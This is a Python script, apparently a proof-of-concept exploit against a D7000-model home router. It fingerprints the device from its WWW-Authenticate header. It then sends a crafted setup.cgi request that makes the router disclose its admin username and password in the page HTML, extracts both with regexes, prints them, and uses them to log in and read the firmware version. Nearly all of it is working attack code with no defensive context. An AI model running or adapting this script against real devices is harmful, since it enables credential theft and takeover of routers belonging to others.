#!/usr/bin/python3

import sys
import warnings
import contextlib
import requests
import re

from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

hostname = "x.y.z.a"
port = 8080
protocol = 'https'
if port == 80:
    protocol = 'http'
url = f"{protocol}://{hostname}:{port}/"

print("Connecting to: {} and port: {}".format(hostname, port))
res = requests.get( url=url, verify=False )

# print("res: {}".format(res.headers))

D7000 = False
if 'WWW-Authenticate' in res.headers:
    if 'D7000' in res.headers['WWW-Authenticate']:
        D7000 = True

if not D7000:
    print("Unable to find D700 signature in the response")
    sys.exit(0)

print("Remote device appears to be an D7000")

res = requests.get( url=f"{protocol}://{hostname}:{port}/setup.cgi?next_file=BRS_swisscom_success.html&x=todo=PNPX_GetShareFolderList", verify=False )
# print("res: {}".format(res.text))

res_text = res.text

matches = re.findall(
    pattern=r"<DIV class=left_div id=passpharse><span languageCode = \"[0-9]+\">Admin user Name</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>",
    string=res_text,
    )

username = ''
if matches:
    username = matches[0]

matches = re.findall(
    pattern=r"<DIV class=left_div id=passpharse><span languageCode = \"[0-9]+\">New Admin password</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>",
    string=res_text,
    )

passphrase = ''
if matches:
    passphrase = matches[0]

if passphrase == '' or username == '':
    print("Unable to find the username/passphrase")
    sys.exit(0)

print(f"Found and using the following credentials: '{username}' and '{passphrase}'")
res = requests.get( url=f"{protocol}://{hostname}:{port}/top.html", verify=False, auth=( username, passphrase) )

res_text = res.text
# print(res_text)

matches = re.findall( 
    pattern=r"<div id=\"firm_version\"><span languageCode = \"[0-9]+\">Firmware Version</span><br />([^\n]+)", 
    string=res_text,)

if matches:
    print(f"Remote server firmware version: {matches[0]}")
else:
    print("Failed to obtain firmware version (maybe we couldn't logon?)")
